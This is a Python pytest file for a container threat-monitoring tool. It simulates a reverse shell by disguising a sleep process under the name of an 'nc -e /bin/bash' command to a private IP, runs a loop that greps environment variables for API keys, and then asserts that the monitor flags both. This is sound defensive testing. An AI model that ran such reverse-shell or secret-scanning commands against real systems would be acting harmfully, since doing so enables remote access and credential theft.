"""Test detection of multiple simultaneous threats."""

import subprocess
import time

import pytest

from support.monitoring import (
    cleanup_container,
    get_container_name_from_workspace,
    get_threat_events,
    wait_for_container_running,
)


def test_concurrent_reverse_shell_and_env_scan(test_workspace, enable_monitoring, coi_binary):
    """Test that both reverse shell AND env scanning are detected when concurrent."""
    proc = subprocess.Popen(
        [
            coi_binary,
            "shell",
            "--workspace",
            test_workspace,
            "--slot",
            "44",
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-44"

    if not wait_for_container_running(container_name, timeout=30):
        proc.terminate()
        pytest.skip(f"Container {container_name} not found or not running")

    # Wait for monitoring baseline
    time.sleep(5)

    # Launch BOTH threats simultaneously
    # 1. Reverse shell pattern (CRITICAL)
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # 2. Environment scanning (WARNING) - run concurrently
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "while true; do env | grep -i api; sleep 2; done",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Wait for monitoring to detect both
    time.sleep(10)

    # Check for BOTH threat types
    events = get_threat_events(container_name)

    critical_process = [
        e for e in events if e.get("level") == "critical" and e.get("category") == "process"
    ]
    warning_env = [
        e for e in events if e.get("level") == "warning" and e.get("category") == "environment"
    ]

    proc.terminate()

    print("\n=== Concurrent Threats Test Debug ===")
    print(f"Total events: {len(events)}")
    print(f"Critical process events: {len(critical_process)}")
    print(f"Warning env events: {len(warning_env)}")
    for event in events:
        print(
            f"- level={event.get('level')}, category={event.get('category')}, "
            f"title={event.get('title')}"
        )
    print("=== End Debug ===\n")

    # Both threats should be detected (container may be killed after critical detected)
    assert len(critical_process) > 0, "Expected CRITICAL process threat for reverse shell"
    # Note: env scanning may or may not be detected before container is killed
    # The key test is that multiple threats CAN be detected in same snapshot

    cleanup_container(container_name, coi_binary)
